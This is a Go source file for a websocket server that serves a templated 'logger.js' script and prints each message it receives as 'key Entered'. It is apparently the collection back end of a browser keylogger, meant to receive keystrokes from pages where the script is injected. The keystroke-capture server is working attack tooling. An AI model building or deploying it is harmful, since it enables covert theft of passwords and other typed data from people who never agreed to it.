package main

import (
	"flag"
	"fmt"
	"html/template"
	"log"
	"net/http"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

var (
	t      *template.Template
	port   string
	wsAddr string
)

var upgrader = websocket.Upgrader{
	ReadBufferSize: 1024, WriteBufferSize: 1024,
}

func init() {
	flag.StringVar(&port, "p", ":8080", "address you want ex :8080")
	flag.StringVar(&wsAddr, "a", "", "websocket address")
	flag.Parse()

	var err error
	t, err = template.ParseFiles("index.html", "logger.js")
	if err != nil {
		log.Panic(err)
	}
}

func handleHome(w http.ResponseWriter, r *http.Request) {
	t.ExecuteTemplate(w, "index.html", nil)
}

func handleWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Panic(err)
	}

	defer conn.Close()

	for {
		_, s, err := conn.ReadMessage()
		if err != nil {
			log.Panic(err)
		}
		fmt.Printf("key Entered: %s\n", string(s))
	}
}

func serveFile(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/javascript")
	t.ExecuteTemplate(w, "logger.js", wsAddr)
}

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/", handleHome).Methods("GET")
	r.HandleFunc("/ws", handleWS).Methods("GET", "POST")
	r.HandleFunc("/script.js", serveFile).Methods("GET")

	log.Fatal(http.ListenAndServe(port, r))
}
